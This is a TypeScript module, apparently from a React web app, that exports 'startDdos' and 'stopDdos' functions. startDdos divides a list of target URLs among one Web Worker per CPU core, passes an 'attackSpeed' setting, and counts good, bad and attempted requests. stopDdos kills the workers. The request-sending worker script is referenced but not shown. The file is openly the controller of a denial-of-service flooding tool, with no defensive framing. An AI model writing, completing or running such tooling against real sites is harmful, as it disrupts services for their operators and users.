import { fetchStatus } from "@/types/defaultTypes";

export const startDdos = (linksArray : string[], changeFetchStatusState : React.Dispatch<React.SetStateAction<fetchStatus>>, attackSpeed : number) => 
{
    const maxWorkers = navigator.hardwareConcurrency || 4; // Используем количество ядер CPU как максимальное количество воркеров
    const chunkSize = Math.ceil(linksArray.length / maxWorkers);
    const linkChunks = [];
    
    for (let i = 0; i < linksArray.length; i += chunkSize) {
        linkChunks.push(linksArray.slice(i, i + chunkSize));
    }
    
    const workers = linkChunks.map(linksChunk => 
    {
        const worker = new Worker("workers/worker.js");
        
        worker.postMessage({linksChunk, attackSpeed});

        worker.onmessage = event => 
        {
            
            const results = event.data;
            if(results == "error")
            {
                changeFetchStatusState(prevState => ({
                    goodFetch: prevState.goodFetch,
                    badFetch: prevState.badFetch + 1,
                    allFetch: prevState.allFetch
                })); 
            }
            else if(results == "ok")
            {
                changeFetchStatusState(prevState => ({
                    goodFetch: prevState.goodFetch + 1,
                    badFetch: prevState.badFetch,
                    allFetch: prevState.allFetch
                })); 
            }
            else if(results == "try_fetch")
            {
                changeFetchStatusState(prevState => ({
                    goodFetch: prevState.goodFetch,
                    badFetch: prevState.badFetch,
                    allFetch: prevState.allFetch + 1
                })); 
            }
        };
    
        // Обрабатываем ошибку, если она возникнет в воркере
        worker.onerror = error => 
        {
            changeFetchStatusState(prevState => ({
                goodFetch: prevState.goodFetch,
                badFetch: prevState.badFetch + 1,
                allFetch: prevState.allFetch
            }));    
            console.error("Ошибка в воркере:", error.message);
        };
    
        return worker;
    });
    
    return workers;
}

export const stopDdos = (workers: Worker[] | undefined) : void => 
{
    if(workers)
    {
        workers.forEach(worker => 
        {
            worker.terminate();
        });
    }
}